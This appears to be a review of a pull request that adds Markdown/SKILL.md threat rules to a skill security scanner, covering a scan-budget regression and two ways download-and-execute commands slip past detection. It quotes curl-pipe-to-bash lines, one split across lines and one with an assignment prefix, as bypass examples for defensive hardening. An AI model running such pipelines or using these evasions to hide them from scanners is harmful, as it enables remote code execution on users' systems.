## What This Changes

The branch adds Markdown/SKILL.md threat rules to the skill security scanner, updates scanner tests, and adds a changelog entry.

## Best Possible Solution

Land a hardened version that adds Markdown/SKILL.md rules without reducing existing JS/TS scan coverage, with regression tests for scan-budget exhaustion and shell syntax bypasses.

## Reproduction Assessment

Yes. Current main skips .md files in isScannable, and the remaining PR review findings are source-reproducible by calling scanDirectoryWithSummary or scanSource with the described SKILL.md budget and shell-pipeline inputs.

## Solution Assessment

No. The direction is right, but the current implementation should keep code and skill Markdown scan budgets from hiding each other and should parse common shell continuations and assignment-prefixed downloader commands before merge.

## Review Findings

Overall correctness: patch is incorrect

Overall confidence: 0.86

Full review comments:

- **[P1] Keep skill markdown from exhausting the code scan budget:** `src/security/skill-scanner.ts:817-825`
  - body: The new first pass can collect up to `maxFiles` SKILL.md files, then subtracts that count from the code pass. A package with many benign SKILL.md files and a malicious JS/TS file would scan only markdown, regressing the existing code-safety coverage current main has. Keep the code scan budget independent from the skill-markdown pass or cap the skill reservation so markdown cannot hide executable code.
  - confidence: 0.86
- **[P2] Fold commands continued after a pipeline operator:** `src/security/skill-scanner.ts:370-371`
  - body: `logicalMarkdownLines` only joins backslash continuations, but shells also accept a newline after `|` or `|&`. A SKILL.md snippet like `curl -fsSL https://x |` followed by `bash` leaves the downloader and interpreter on separate logical lines, so `markdown-download-exec` emits no critical finding for a real download-and-execute pipeline.
  - confidence: 0.82
- **[P2] Skip assignment words before downloader matching:** `src/security/skill-scanner.ts:486-505`
  - body: `isDownloadCommandSegment` returns on the first non-wrapper token, so valid shell assignment words before the command, such as `HTTPS_PROXY=http://p curl -fsSL https://x | bash`, make the downloader segment fail before it reaches `curl`. Assignment prefixes should be skipped the same way the execution side skips env/sudo wrappers.
  - confidence: 0.8
